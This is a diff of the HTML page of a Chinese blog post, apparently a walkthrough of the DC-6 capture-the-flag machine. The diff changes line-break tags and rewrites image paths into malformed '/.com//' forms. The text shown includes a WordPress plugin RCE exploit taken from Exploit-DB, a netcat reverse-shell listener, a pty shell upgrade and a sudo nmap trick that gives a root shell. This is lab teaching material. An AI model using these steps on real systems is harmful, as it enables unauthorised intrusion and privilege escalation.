@@ -41,15 +41,15 @@
 <meta property="og:url" content="http://example.com/posts/e38f4498/index.html">
 <meta property="og:site_name" content="Mamor&#39;s Blog">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/posts/e38f4498/nc1.png">
-<meta property="og:image" content="http://example.com/posts/e38f4498/nc2.png">
-<meta property="og:image" content="http://example.com/posts/e38f4498/flag.png">
+<meta property="og:image" content="http://example.com/.com//nc1.png">
+<meta property="og:image" content="http://example.com/.com//nc2.png">
+<meta property="og:image" content="http://example.com/.com//flag.png">
 <meta property="article:published_time" content="2021-05-04T06:03:46.000Z">
 <meta property="article:modified_time" content="2021-05-07T06:05:47.853Z">
 <meta property="article:author" content="Mamor">
 <meta property="article:tag" content="DCchallenges">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/posts/e38f4498/nc1.png">
+<meta name="twitter:image" content="http://example.com/.com//nc1.png">
 
 <link rel="canonical" href="http://example.com/posts/e38f4498/">
 
@@ -305,7 +305,7 @@
 <p>CLUE<br>OK, this isn’t really a clue as such, but more of some “we don’t want to spend five years waiting for a certain process to finish” kind of advice for those who just want to get on with the job.</p>
 <p>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt That should save you a few years. ;-)</p>
 </blockquote>
-<br/>
+<br>
 
 <p>环境</p>
 <blockquote>
@@ -313,7 +313,7 @@
 <p>kali    192.168.18.131</p>
 <p>靶机 </p>
 </blockquote>
-<br/>
+<br>
 
 <p>扫描网段</p>
 <blockquote>
@@ -339,7 +339,7 @@
 <p>[19:44:44] 302 -    0B  - /wp-signup.php  -&gt;  <a target="_blank" rel="noopener" href="http://wordy/wp-login.php?action=register">http://wordy/wp-login.php?action=register</a></p>
 <p>… …</p>
 </blockquote>
-<br/>
+<br>
 
 <p>浏览器登录<code>192.168.18.137</code>发现会跳转到<code>http://wordy</code>，那需要修改一下host</p>
 <blockquote>
@@ -384,7 +384,7 @@
 <hr>
 <p>Shellcodes: No Results</p>
 </blockquote>
-<br/>
+<br>
 
 <blockquote>
 <p>kali@kali2020:~/Tools/DCchallenges/DCchallenges6$ sudo cp /usr/share/exploitdb/exploits/php/webapps/45274.html 45274.html</p>
@@ -392,8 +392,8 @@
 <p>可以看到这是个Activity monitor插件的RCE,执行点在<code>TOOLS</code>下的<code>IP or interger</code></p>
 <p>提前监听kali的端口<code>nc -nlvp 8888</code></p>
 <p>使用burp抓包</p>
-<p><img src="nc1.png"><br><img src="nc2.png"></p>
-<br/>
+<p><img src="/.com//nc1.png"><br><img src="/.com//nc2.png"></p>
+<br>
 
 <p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
 <p>返回/home 看到有四个用户，</p>
@@ -443,7 +443,7 @@
 <p>jens@dc-6:~$ nmap -V</p>
 <p>Nmap version 7.40 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> )<br>Platform: x86_64-pc-linux-gnu<br>Compiled with: liblua-5.3.3 openssl-1.1.0c libpcre-8.39 libpcap-1.8.1 nmap-libdnet-1.12 ipv6<br>Compiled without:<br>Available nsock engines: epoll poll select</p>
 </blockquote>
-<br/>
+<br>
 
 <blockquote>
 <p>TF=$(mktemp)<br>echo ‘os.execute(“/bin/sh”)’ &gt; $TF<br>sudo nmap –script=$TF</p>
@@ -458,10 +458,10 @@
 <blockquote>
 <p>TF=$(mktemp)<br>echo ‘os.execute(“/bin/sh”)’ &gt; $TF<br>sudo nmap –script=$TF</p>
 </blockquote>
-<p>成功上升为root权限,进入/root得到flag<br><img src="flag.png"></p>
-<br/>
+<p>成功上升为root权限,进入/root得到flag<br><img src="/.com//flag.png"></p>
+<br>
 
-<br/>
+<br>
 
 <p>总结</p>
 <ul>
@@ -476,9 +476,9 @@
 <li><p>nmap提权</p>
 </li>
 </ul>
-<br/>
+<br>
 
-<br/>
+<br>
 
 
 <p>Reference</p>
